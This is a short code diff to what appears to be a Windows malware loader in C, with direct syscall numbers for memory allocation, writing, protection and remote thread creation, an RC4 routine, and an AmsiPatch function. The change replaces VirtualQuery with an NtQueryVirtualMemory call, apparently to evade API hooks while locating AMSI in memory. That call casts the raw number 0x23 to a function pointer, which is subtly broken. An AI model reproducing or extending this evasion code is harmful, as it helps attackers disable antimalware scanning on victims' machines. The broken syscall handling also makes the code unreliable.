@@ -17,7 +17,8 @@ enum syscall_no {
 	SysNtAllocateVirtualMem = 0x18,
 	SysNtWriteVirtualMem = 0x3A,
 	SysNtProtectVirtualMem = 0x50,
-	SysNtCreateThreadEx = 0xC2
+	SysNtCreateThreadEx = 0xC2,
+	SysNtQueryVirtualMemory = 0x23
 };
 
 /* RC4 function */
@@ -164,9 +165,11 @@ BOOL AmsiPatch() {
 	size_t region_count = 0;
 	unsigned char* pAddress = 0;
 	MEMORY_BASIC_INFORMATION memInfo;
+	size_t returnLength;
 	while (pAddress < (unsigned char*)sysInfo.lpMaximumApplicationAddress && region_count < MAX_REGIONS) {
 		// Query memory region information
-		if (VirtualQuery(pAddress, &memInfo, sizeof(memInfo))) {
+		_NtQueryVirtualMemory pNtQueryVirtualMemory = (_NtQueryVirtualMemory)SysNtQueryVirtualMemory;
+		if (pNtQueryVirtualMemory(GetCurrentProcess(), (PVOID)pAddress, MemoryBasicInformation, &memInfo, sizeof(memInfo), &returnLength) == 0) {
 			regions[region_count] = memInfo;
 			region_count++;
 		}
